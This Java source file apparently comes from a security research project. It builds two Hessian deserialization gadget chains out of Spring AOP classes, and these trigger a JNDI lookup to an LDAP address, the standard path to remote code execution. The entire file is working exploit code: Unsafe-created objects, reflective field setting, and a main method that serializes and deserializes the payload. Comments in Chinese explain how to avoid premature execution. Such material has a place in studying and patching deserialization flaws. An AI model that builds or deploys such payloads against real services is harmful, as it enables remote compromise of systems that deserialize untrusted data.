package com.test.gadget;

import com.sun.org.apache.xpath.internal.objects.XString;
import org.springframework.aop.aspectj.AbstractAspectJAdvice;
import org.springframework.aop.aspectj.AspectJAroundAdvice;
import org.springframework.aop.aspectj.AspectJPointcutAdvisor;
import org.springframework.aop.aspectj.annotation.BeanFactoryAspectInstanceFactory;
import org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor;
import org.springframework.aop.support.DefaultPointcutAdvisor;
import org.springframework.aop.target.HotSwappableTargetSource;
import org.springframework.jndi.support.SimpleJndiBeanFactory;
import tools.HessianTools;
import tools.ReflectTools;
import tools.UnsafeTools;

import java.util.HashMap;
import java.util.HashSet;
import java.util.Set;

public class SpringBased {
    public static void main(String[] args) throws Exception {
        Object o = pointcutAdvisor();
        byte[] bytes = HessianTools.hessian2Ser2bytes(o);
        HessianTools.hessian2Deser(bytes);
    }

    public static Object advisorHolder() throws Exception {
        String url = "ldap://127.0.0.1:50389/d64c0c";
        SimpleJndiBeanFactory simpleJndiBeanFactory = new SimpleJndiBeanFactory();
        Set<String> set = new HashSet<String>();
        set.add("any");

        // 直接通过构造方法会提前执行
        BeanFactoryAspectInstanceFactory beanFactoryAspectInstanceFactory = (BeanFactoryAspectInstanceFactory) UnsafeTools.getObjectByUnsafe(BeanFactoryAspectInstanceFactory.class);
        ReflectTools.setFinalField(beanFactoryAspectInstanceFactory, "beanFactory", simpleJndiBeanFactory);
        ReflectTools.setFinalField(beanFactoryAspectInstanceFactory, "name", url);

        AbstractAspectJAdvice aspectJAroundAdvice = (AbstractAspectJAdvice) UnsafeTools.getObjectByUnsafe(AspectJAroundAdvice.class);
        ReflectTools.setFieldValue(aspectJAroundAdvice, "aspectInstanceFactory", beanFactoryAspectInstanceFactory);

        AspectJPointcutAdvisor aspectJPointcutAdvisor = (AspectJPointcutAdvisor) UnsafeTools.getObjectByUnsafe(AspectJPointcutAdvisor.class);
        ReflectTools.setFieldValue(aspectJPointcutAdvisor, "advice", aspectJAroundAdvice);
        ReflectTools.setFieldValue(aspectJPointcutAdvisor, "order", null);

        Class<?> aClass = Class.forName("org.springframework.aop.aspectj.autoproxy.AspectJAwareAdvisorAutoProxyCreator$PartiallyComparableAdvisorHolder");
        Object objectByUnsafe = UnsafeTools.getObjectByUnsafe(aClass);
        ReflectTools.setFieldValue(objectByUnsafe, "advisor", aspectJPointcutAdvisor);

        Object xString = UnsafeTools.getObjectByUnsafe(XString.class);
        HotSwappableTargetSource hotSwappableTargetSource = new HotSwappableTargetSource(xString);
        HotSwappableTargetSource other = new HotSwappableTargetSource(objectByUnsafe);

        HashMap<Object, Object> hashMap = ReflectTools.makeMap(other, hotSwappableTargetSource);


        return hashMap;
    }

    public static Object pointcutAdvisor() throws Exception {
        String url = "ldap://127.0.0.1:50389/d64c0c";
        SimpleJndiBeanFactory simpleJndiBeanFactory = new SimpleJndiBeanFactory();
        Set<String> set = new HashSet<String>();
        set.add(url);
        ReflectTools.setFieldValue(simpleJndiBeanFactory, "shareableResources", set);



        Object defaultBeanFactoryPointcutAdvisor = UnsafeTools.getObjectByUnsafe(DefaultBeanFactoryPointcutAdvisor.class);
        ReflectTools.setFieldValue(defaultBeanFactoryPointcutAdvisor, "beanFactory", simpleJndiBeanFactory);
        ReflectTools.setFieldValue(defaultBeanFactoryPointcutAdvisor, "adviceBeanName", url);

        // AbstractPointcutAdvisor的子类，且没实现equals方法的都行, AsyncAnnotationAdvisor\DefaultPointcutAdvisor
        Object defaultPointcutAdvisor = UnsafeTools.getObjectByUnsafe(DefaultPointcutAdvisor.class);
        HotSwappableTargetSource hotSwappableTargetSource = new HotSwappableTargetSource(defaultPointcutAdvisor);
        HotSwappableTargetSource other = new HotSwappableTargetSource(defaultBeanFactoryPointcutAdvisor);

        HashMap<Object, Object> hashMap = ReflectTools.makeMap(other, hotSwappableTargetSource);

        return hashMap;
    }

}
